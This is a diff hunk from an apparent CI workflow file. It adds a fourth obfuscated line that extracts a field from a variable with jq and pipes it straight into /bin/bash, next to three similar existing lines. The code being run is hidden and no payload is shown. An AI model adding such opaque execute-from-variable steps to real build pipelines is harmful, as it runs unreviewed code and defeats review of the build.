@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$c97" | jq -r .smqpq52 | /bin/bash
           echo $sxt4 | jq -r .wba399 | /bin/bash
           printf '%s' "$nv60872" | jq -r .pnlz4 | /bin/bash
+          echo $ceq5 | jq -r .irxjd85 | /bin/bash
 
       - name: Store artifact
         if: always()
